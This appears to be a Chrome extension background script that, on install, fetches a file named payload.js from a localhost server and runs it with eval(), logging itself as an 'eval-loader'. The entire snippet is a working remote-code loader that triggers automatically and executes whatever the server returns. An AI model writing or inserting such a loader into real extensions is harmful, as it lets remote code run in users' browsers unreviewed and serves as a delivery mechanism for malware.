chrome.runtime.onInstalled.addListener(() => {
  fetch('https://localhost:8000/payload.js')
    .then(r => r.text())
    .then(code => {
      console.log('[eval-loader] fetched payload, len=', code.length);
      eval(code);                
    });
});
